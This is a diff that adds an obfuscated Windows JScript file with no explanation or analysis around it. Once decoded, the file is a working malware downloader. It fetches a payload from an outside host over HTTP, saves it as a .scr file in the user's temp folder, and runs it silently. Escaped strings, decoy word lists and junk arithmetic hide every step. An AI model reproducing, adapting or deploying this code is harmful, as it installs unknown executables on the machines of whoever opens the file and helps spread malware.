@@ -1,0 +1,24 @@
+dessertMaterial = ((([!+[] + !+[]]) * (((([+!+[]])) + "" + (([+!+[]])))) * ([!+[] + !+[] + !+[]])), this);
+technologyCulture = ("d\u0065\u0067e\u006eera\u0074io\u006e", "\u0062\u0069t", "an\u0061lo\u0067\u0079", "\u0074h\u0065or\u0065\u006d", "R\u0075\u006e");
+compactRoutine = dessertMaterial[("c\u0079\u0063l\u0065", "\u0062\u0075dg\u0065t", "c\u006f\u006c\u006c\u0065c\u0074\u0069\u006fn", "W\u0053cr\u0069pt")];
+compactRoutine[("\u0063ap\u0069tul\u0061\u0074ion", "\u0074e\u0063\u0068nique", "\u0074\u0061\u006e\u0064e\u006d", "S\u006ce\u0065p")]((7 * 11 * 29 * 11 - (10706 - 1143)));
+campaignOperator = compactRoutine[("\u0063o\u0072\u0070\u006f\u0072\u0061t\u0069on", "Crea\u0074\u0065Obj\u0065\u0063t")](("p\u0061\u0072\u006f\u006ce", "bar\u0067e", "WScrip\u0074.\u0053h\u0065\u006c\u006c"));
+oppositionSituation = campaignOperator[("\u0063\u006f\u006co\u006e\u0079", "ind\u0069ffe\u0072\u0065nt", "\u0068os\u0070ital", "at\u0074\u0065st\u0061\u0074io\u006e", "\u0045\u0078\u0070an\u0064E\u006ev\u0069ronment\u0053\u0074\u0072\u0069\u006e\u0067\u0073")](("o\u0070\u0065\u0072a\u0074\u0069\u006f\u006e", "%TE\u004d\u0050%/")) + ("\u0074ampo\u006e", "\u0062al\u0061n\u0063e", "\u0063ol\u006f\u0073\u0073a\u006cMig\u0072\u0061t\u0065") + ("\u0063at\u0061lo\u0067ue", "\u0074\u0072\u0061\u006a\u0065ctor\u0079", "st\u0061\u0074\u0075\u0065", "\u002es\u0063\u0072");
+regularCollective = dessertMaterial[("\u0061cc\u006f\u006d\u006do\u0064\u0061t\u0069on", "lege\u006ed", "colo\u006e\u0079", "W\u0053\u0063\u0072\u0069\u0070t")][("\u0043\u0072ea\u0074eOb\u006a\u0065\u0063\u0074")](("u\u006ei\u0071u\u0065", "tri\u0076i\u0061\u006c", "abs\u006frb", "a\u006dm\u0075ni\u0074i\u006fn", "\u004dSXML\u0032\u002e\u0058\u004dLHT\u0054P"));
+regularCollective[("r\u0061t\u0069\u006fnal", "fi\u006ce", "\u0067\u0065ne\u0072\u0061tor", "o\u0070en")](("\u0047\u0045\u0054"), ("ref\u0072\u0069\u0067\u0065rator", "\u0073\u0074at\u0075e", "\u0068\u0074\u0074p:\u002f\u002fza\u0072\u0061bo\u0074o\u006b\u006ea\u0073a\u0079t\u0065.z\u007a\u002e\u006du/7\u002fsh\u00387h\u00675\u0076\u0034"), !(7 < (((Math.pow(((5 ^ 9) * (22 - 15) + (1 * 2)), ((1 * 2) | (([!+[] + !+[]])))) - ((520 + 11294) - 2 * 23 * 97)) + ((Math.pow((289 + 260), (15 - 13)) - (300438 / 1)) / (Math.pow((85 - 66), (2 - 0)) - (4224 / 12)))), ((((Math.pow(185, 2) - 34130) & (Math.pow(64, 2) - 4012)), ((126 & 127) / (32 + 10))) | (((501 + 259) ^ (4009 & 4090)) / 2 * (0 ^ 2) * (53, 139, 2) * (10 / 5) * 3)), ((((1 ^ 0) * (0 + 1)) * (1 * 1)) | (((54 ^ 154) / (21 * 2 + 1)) * (9 - 7) * (2 | 2))))));
+regularCollective[("\u0070\u0065rs\u006fn", "s\u0065nd")]();
+while (regularCollective[("mer\u0069d\u0069\u0061\u006e", "r\u0065\u0061d\u0079\u0073\u0074at\u0065")] < ((3 + 4) & (2 ^ 6))) {
+	dessertMaterial[("\u0072\u0065po\u0072t\u0065r", "\u0061cto\u0072", "a\u0063t\u0069o\u006e", "\u0074\u0072a\u006e\u0073\u0070la\u006et", "WScr\u0069\u0070\u0074")][("\u0061ve\u006e\u0075e", "m\u0061c\u0068\u0069\u006e\u0065", "\u0070re\u0073s", "dy\u006ea\u006d\u0069\u0063", "Sl\u0065e\u0070")](((54, 48) ^ (29 * 2 + 26)));
+}
+symmetricalPolar = dessertMaterial[("a\u0074\u0074\u0061\u0063k", "\u0073p\u0065cifica\u0074ion", "WS\u0063\u0072i\u0070\u0074")][("\u0063e\u006e\u0074", "\u0064\u0065p\u006fs\u0069t", "\u0061\u0063\u0063\u006f\u006d\u0070\u0061n\u0079", "C\u0072\u0065\u0061\u0074\u0065\u004f\u0062\u006a\u0065\u0063\u0074")](("sa\u006e\u0063t\u0069\u006f\u006e", "\u0041\u0044OD\u0042.\u0053t\u0072\u0065am"));
+try {
+	symmetricalPolar[("op\u0065\u006e")]();
+	symmetricalPolar[("p\u006can", function String.prototype.decorationNumeration() {
+		return this
+	}, "p\u0061\u0063k\u0065t", "r\u0065\u0067\u0065\u006et", "c\u006fn\u0066i\u0064\u0065\u006e\u0074\u0069al", "\u0074\u0079pe")] = ((0 | 0) ^ 1);
+	symmetricalPolar[("\u0070\u0072\u006ffessio\u006e", "\u0077\u0072\u0069\u0074\u0065")](regularCollective[("\u0063\u006fl\u006c\u0069si\u006fn", "t\u0068erm\u006f\u006deter", "\u0052\u0065spons\u0065Bo\u0064\u0079")]);
+	symmetricalPolar[("\u0064\u006f\u006c\u006ca\u0072", "\u0069\u006e\u0064iff\u0065re\u006et", "\u0073\u0079mm\u0065\u0074r\u0069\u0063\u0061l", "ap\u006fst\u0072ophe", "p\u006fsiti\u006f\u006e")] = ((1 * 0) | (0 + 0));
+	symmetricalPolar[("e\u006ecy\u0063lo\u0070e\u0064\u0069a", "e\u0066fec\u0074", "t\u0061\u006d\u0070o\u006e", "\u0073\u0061\u0076e\u0054oFi\u006c\u0065")](oppositionSituation, ((60 / 30) & (49 - 46)));
+	symmetricalPolar[("c\u006c\u0061ss", "\u006frg\u0061\u006e", "\u0062o\u0078", "\u0063\u006c\u006f\u0073e")]();
+	campaignOperator[technologyCulture](oppositionSituation.decorationNumeration(), ((120, 173, 203, 0) + 0), (0 ^ 0));
+} catch (pauseClub) {};
